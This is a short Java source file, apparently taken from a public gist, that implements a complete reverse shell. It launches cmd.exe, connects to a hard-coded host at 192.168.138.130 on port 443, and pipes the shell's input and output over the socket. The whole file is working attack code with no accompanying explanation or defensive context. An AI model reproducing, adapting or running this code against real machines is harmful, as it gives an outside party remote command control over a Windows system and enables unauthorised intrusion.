// https://gist.github.com/caseydunham/53eb8503efad39b83633961f12441af0
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShell {

    public static void main(String[] args) {
        try {
            String host="192.168.138.130";
            int port=443;
            String cmd="cmd.exe";
            Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s=new Socket(host,port);
            InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
            OutputStream po=p.getOutputStream(),so=s.getOutputStream();
            while(!s.isClosed()) {
            while(pi.available()>0)
                so.write(pi.read());
            while(pe.available()>0)
                so.write(pe.read());
            while(si.available()>0)
                po.write(si.read());
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception e){
            }
            };
            p.destroy();
            s.close();
        } catch (Exception e) {
            System.out.println("Ops, it cant work!");
        }
        
    }
}